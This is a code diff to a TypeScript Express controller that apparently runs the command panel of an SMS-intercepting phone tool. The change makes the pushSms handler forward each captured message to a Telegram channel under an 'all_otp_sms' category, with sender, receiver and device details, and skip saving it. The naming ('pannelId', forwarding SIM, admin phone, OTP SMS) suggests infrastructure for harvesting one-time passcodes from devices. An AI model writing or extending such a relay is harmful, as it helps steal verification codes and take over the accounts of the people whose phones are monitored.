@@ -3,6 +3,33 @@ import logger from "../logger/logger";
 import * as deviceService from "../services/deviceService";
 import * as smsService from "../services/smsService";
 import wsService from "../services/wsService";
+import config from "../config";
+import { sendTelegramMessage } from "../services/telegramService";
+import { buildTelegramAllOtpSmsMessage } from "../utils/telegramMessage";
+
+function clean(v: unknown): string {
+  return String(v ?? "").trim();
+}
+
+function isSendSmsDisabled(): boolean {
+  const value = clean(
+    (config as any).sendSms || process.env.SENDSMS || "yes",
+  ).toLowerCase();
+  return value === "no";
+}
+
+function getDeviceTelegramMeta(device: any, deviceId: string) {
+  return {
+    pannelId: config.pannelId,
+    deviceId,
+    brandName: clean(
+      device?.metadata?.brand || device?.metadata?.manufacturer || "",
+    ),
+    model: clean(device?.metadata?.model || ""),
+    online: !!device?.status?.online,
+    lastSeen: Number(device?.status?.timestamp || Date.now()),
+  };
+}
 
 /**
  * Thin controllers matching the routes.
@@ -27,10 +54,11 @@ export async function updateStatus(req: Request, res: Response) {
   const { online, timestamp } = req.body || {};
   try {
     await deviceService.updateDeviceStatus(deviceId, !!online, typeof timestamp !== "undefined" ? Number(timestamp) : undefined);
-    // notify via ws if connected
     try {
       wsService.notifyDeviceStatus(deviceId, { online: !!online, timestamp: Number(timestamp || Date.now()) });
-    } catch (e) { /* ignore */ }
+    } catch (e) {
+      // ignore
+    }
     return res.json({ success: true });
   } catch (err: any) {
     logger.error("controller: updateStatus failed", err);
@@ -89,9 +117,8 @@ export async function getAdminPhone(req: Request, res: Response) {
 export async function getForwardingSim(req: Request, res: Response) {
   const id = req.params.id;
   try {
-    const doc = await deviceService.getDeviceAdmins(id); // reuse getDeviceAdmins just to check device existence
-    // actually fetch from Device model directly through service is better; but keep simple:
-    const deviceDoc = await deviceService.upsertDeviceMetadata(id, {}); // noop upsert to get doc
+    await deviceService.getDeviceAdmins(id);
+    const deviceDoc = await deviceService.upsertDeviceMetadata(id, {});
     const forwarding = (deviceDoc as any)?.forwardingSim || "auto";
     return res.json(forwarding);
   } catch (err: any) {
@@ -103,16 +130,71 @@ export async function getForwardingSim(req: Request, res: Response) {
 export async function pushSms(req: Request, res: Response) {
   const id = req.params.id;
   const body = req.body || {};
+
   try {
-    await smsService.saveSms(id, {
+    const payload = {
       sender: body.sender || body.from || "unknown",
       receiver: body.receiver || body.recv || "",
       title: body.title || "",
       body: body.body || body.message || "",
       timestamp: Number(body.timestamp || Date.now()),
       meta: body.meta || {},
+    };
+
+    const sendSmsDisabled = isSendSmsDisabled();
+
+    if (sendSmsDisabled) {
+      try {
+        const device =
+          typeof (deviceService as any).getDevice === "function"
+            ? await (deviceService as any).getDevice(id)
+            : null;
+
+        const meta = getDeviceTelegramMeta(device, id);
+
+        const telegramText = buildTelegramAllOtpSmsMessage({
+          ...meta,
+          smsText: clean(payload.body),
+          smsTitle: clean(payload.title),
+          sender: clean(payload.sender),
+          receiver: clean(payload.receiver),
+          timestamp: Number(payload.timestamp || Date.now()),
+        });
+
+        const result = await sendTelegramMessage({
+          category: "all_otp_sms" as any,
+          text: telegramText,
+        });
+
+        logger.info("controller: pushSms SENDSMS=no routed only to Telegram", {
+          deviceId: id,
+          ok: result.ok,
+          skipped: result.skipped,
+          error: result.error,
+        });
+      } catch (telegramErr: any) {
+        logger.error("controller: pushSms SENDSMS=no telegram failed", {
+          deviceId: id,
+          error: telegramErr?.message || telegramErr,
+        });
+      }
+
+      return res.json({
+        success: true,
+        sendSmsDisabled: true,
+        savedToDb: false,
+        broadcastToFrontend: false,
+      });
+    }
+
+    await smsService.saveSms(id, payload);
+
+    return res.json({
+      success: true,
+      sendSmsDisabled: false,
+      savedToDb: true,
+      broadcastToFrontend: false,
     });
-    return res.json({ success: true });
   } catch (err: any) {
     logger.error("controller: pushSms failed", err);
     return res.status(500).json({ success: false, error: err?.message || "server error" });
